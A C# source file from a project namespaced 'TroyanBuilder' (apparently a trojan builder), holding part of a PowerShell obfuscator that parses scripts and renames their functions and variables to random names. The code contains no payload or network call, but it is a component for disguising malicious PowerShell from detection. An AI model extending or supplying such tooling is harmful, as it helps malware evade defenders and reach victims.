using System.Management.Automation.Language;

namespace TroyanBuilder;

public partial class PowerShellObfuscator
{
    private  readonly Dictionary<string,Dictionary<string, string>> RenamedFunc = new();
    
    private void ObfuscateFunctions(Parsed parsed, string scope)
    {
        foreach (var functionAst in parsed.Body.FindAll(x => x is FunctionDefinitionAst, false).Cast<FunctionDefinitionAst>())
        {
            ObfuscateFunction(functionAst);
        }
    }

    private void ObfuscateFunction(FunctionDefinitionAst functionAst)
    {
        var psScript = functionAst.Body.ToString();
        var parsed = Parse(psScript);
        FindAndRenameVariables(parsed, functionAst.Name, true);
    }

    private void AddRenamedFunction(string name, string renamed)
    {
        var scope = "general";
        if (Exclusions.Contains(name))
        {
            renamed = name;
        }
        RenamedFunc.TryAdd(scope, new Dictionary<string, string>());
        RenamedFunc[scope].TryAdd(name, renamed);
    }
        
    private bool TryGetRenamedFunc( string name, out string newName)
    {
        var scope = "general";
        newName = name;
        var got = RenamedFunc.TryGetValue(scope, out var dict);
        if (!got)
            return false;
        got = dict!.TryGetValue(name, out var x);
        if (!got)
            return false;
        newName = x;
        return true;
    }
    
                       
    private void FindAndRenameFunctions(Parsed parsed, string scope)
    {
        var funcs = parsed.Body.FindAll(x => x is FunctionDefinitionAst, false).Cast<FunctionDefinitionAst>()
            .ToList();
        foreach (var functionAst in funcs)
        {
            var newName = GenerateRandomName() + "_f";
            AddRenamedFunction(functionAst.Name, newName);
        }
    }

}